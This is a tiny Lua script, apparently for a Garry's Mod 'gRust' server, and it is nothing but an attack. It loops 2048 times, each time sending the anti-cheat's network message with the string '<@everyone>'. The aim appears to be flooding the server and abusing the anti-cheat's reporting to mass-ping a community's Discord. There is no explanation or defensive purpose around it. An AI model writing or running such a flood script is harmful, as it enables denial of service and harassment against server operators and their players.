for i = 1, 2048 do
    net.Start(gRust.AC.NetCode)
        net.WriteString( "<@everyone>" )
    net.SendToServer()
end



